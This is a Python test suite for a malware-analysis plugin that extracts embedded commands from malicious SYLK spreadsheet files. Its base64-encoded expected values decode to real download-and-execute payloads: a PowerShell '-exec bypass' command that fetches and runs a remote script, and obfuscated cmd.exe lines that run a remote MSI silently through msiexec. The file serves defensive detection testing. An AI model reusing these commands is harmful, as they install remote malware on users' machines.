"""
Office SYLK test suite
======================

"""

import base64

from azul_runner import FV, Event, FeatureValue, JobResult, State, test_template

from azul_plugin_office.plugin_sylk import AzulPluginOfficeSylk


def b64FV(b64_encoded_val: str, label: str | None = None) -> FeatureValue:
    """Convert a base64 encoded value into a normal feature value"""
    decoded_val = base64.b64decode(b64_encoded_val).decode()
    return FV(decoded_val, label=label)


class TestExecute(test_template.TestPlugin):
    PLUGIN_TO_TEST = AzulPluginOfficeSylk

    def test_malicious_cmd(self):
        """Malicious .slk with CMD"""
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_test_file_bytes(
                        "cabb190a05e7381e07c42e37f01c1eec8b0c5323d5c5633c61e44df90d905c9e",
                        "Malicious SYLK file with embedded command.",
                    ),
                )
            ]
        )
        self.assertJobResult(
            result,
            JobResult(
                state=State(State.Label.COMPLETED),
                events=[
                    Event(
                        entity_type="binary",
                        entity_id="cabb190a05e7381e07c42e37f01c1eec8b0c5323d5c5633c61e44df90d905c9e",
                        features={
                            "file_format_legacy": [FV("SYLK")],
                            "sylk_command": [
                                b64FV(
                                    "JyIvYyBjOlx3aW5kb3dzXHN5c3RlbTMyXHJ1bmRsbDMyLmV4ZSBTaGVsbDMyLkRMTCxTaGVsbEV4ZWNfUnVuRExMIGNtZCAvYyBwb3dlcnNoZWxsLmV4ZSAtZXhlYyBieXBhc3MgLXcgMSAtYyAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCcnaHR0cDovL3Rvb2xzLm5ld3NyZW50YWwubmV0L2pzeGxobHdkZy9weHhhcy8nJywnJyV0ZW1wJVxjcm9taW4ucHMxJycpOzsldGVtcCVcY3JvbWluLnBzMSIn",
                                    label="CMD",
                                ),
                            ],
                            "sylk_command_normalised": [
                                b64FV(
                                    "L2MgYzpcd2luZG93c1xzeXN0ZW0zMlxydW5kbGwzMi5leGUgc2hlbGwzMi5kbGwsc2hlbGxleGVjX3J1bmRsbCBjbWQgL2MgcG93ZXJzaGVsbC5leGUgLWV4ZWMgYnlwYXNzIC13IDEgLWMgKG5ldy1vYmplY3Qgc3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2FkZmlsZSgnaHR0cDovL3Rvb2xzLm5ld3NyZW50YWwubmV0L2pzeGxobHdkZy9weHhhcy8nLCcldGVtcCVcY3JvbWluLnBzMScpOzsldGVtcCVcY3JvbWluLnBzMQ=="
                                )
                            ],
                            "sylk_function": [FV("CMD")],
                            "sylk_url": [FV("http://tools.newsrental.net/jsxlhlwdg/pxxas/")],
                        },
                    )
                ],
            ),
        )

    def test_malicious_exec(self):
        """Malicious .slk with EXEC"""
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_test_file_bytes(
                        "3a7b76b0ffbea4aab166c1ab4f3f4cbe6324da34cc6370abfbe19af20e259d59", "Malicious SYLK file."
                    ),
                )
            ]
        )
        self.assertJobResult(
            result,
            JobResult(
                state=State(State.Label.COMPLETED),
                events=[
                    Event(
                        entity_type="binary",
                        entity_id="3a7b76b0ffbea4aab166c1ab4f3f4cbe6324da34cc6370abfbe19af20e259d59",
                        features={
                            "file_format_legacy": [FV("SYLK")],
                            "sylk_command": [
                                b64FV(
                                    "IkNtZC5leGUgL2MgQGVjaG8gb2ZmJnBpXm5eZyA1NCAtbiAxJmVjaG98c2V0IC9wPSIiaWV4ZWMgL2lodHRwXjpeL14vXmxpbnV4IiI+PiV0ZW1wJVxmUm5GcS5iYXQi",
                                    label="EXEC",
                                ),
                                b64FV(
                                    "IkNtZC5leGUgL2MgZWNob3xTRXQgL3A9IiJAZWNobyBvZmYmd21eaWMgcHJvXmNeZXNecyBjXmFebGwgY3JeZWF0XmUgJ01zIiI+JXRlbXAlXGZSbkZxLmJhdCI=",
                                    label="EXEC",
                                ),
                                b64FV(
                                    "ImNtZC5leGUgL2MgQGVjaG8gb2ZmJnBpXm5eZyA1NCAtbiAzJmVjaG98c15ldCAvcD0iImd1bmRlbS5jb20vY2F0LnBocCAiIj4+JXRlbXAlXGZSbkZxLmJhdCI=",
                                    label="EXEC",
                                ),
                                b64FV(
                                    "ImNtZC5leGUgL2MgQGVjaG8gb2ZmJnBpXm5eZyA1NCAtbiA1JmVjaG98c2V0IC9wPSIiIF4vcSciIj4+JXRlbXAlXGZSbkZxLmJhdCYldGVtcCVcZlJuRnEuYmF0Ig==",
                                    label="EXEC",
                                ),
                            ],
                            "sylk_command_normalised": [
                                b64FV(
                                    "Y21kLmV4ZSAvYyBAZWNobyBvZmYmcGluZyA1NCAtbiAxJmVjaG98c2V0IC9wPSIiaWV4ZWMgL2lodHRwOi8vbGludXgiIj4+JXRlbXAlXGZybmZxLmJhdA=="
                                ),
                                b64FV(
                                    "Y21kLmV4ZSAvYyBAZWNobyBvZmYmcGluZyA1NCAtbiAzJmVjaG98c2V0IC9wPSIiZ3VuZGVtLmNvbS9jYXQucGhwICIiPj4ldGVtcCVcZnJuZnEuYmF0"
                                ),
                                b64FV(
                                    "Y21kLmV4ZSAvYyBAZWNobyBvZmYmcGluZyA1NCAtbiA1JmVjaG98c2V0IC9wPSIiIC9xJyIiPj4ldGVtcCVcZnJuZnEuYmF0JiV0ZW1wJVxmcm5mcS5iYXQ="
                                ),
                                b64FV(
                                    "Y21kLmV4ZSAvYyBlY2hvfHNldCAvcD0iIkBlY2hvIG9mZiZ3bWljIHByb2Nlc3MgY2FsbCBjcmVhdGUgJ21zIiI+JXRlbXAlXGZybmZxLmJhdA=="
                                ),
                            ],
                            "sylk_function": [FV("EXEC"), FV("HALT")],
                            "sylk_url": [FV("http://linux")],
                        },
                    )
                ],
            ),
        )

    def test_non_sylk_doc(self):
        """Test wrong format file"""
        result = self.do_execution(
            data_in=[
                (
                    "content",
                    self.load_test_file_bytes(
                        "ffc7df1b29a93d861ad70ed3d5bccdfa4312140185520cc6a58cce5b9e11215a",
                        "Malicious Microsoft Excel document, auto open macro.",
                    ),
                )
            ],
            verify_input_content=False,
        )
        self.assertJobResult(result, JobResult(state=State(State.Label.OPT_OUT)))
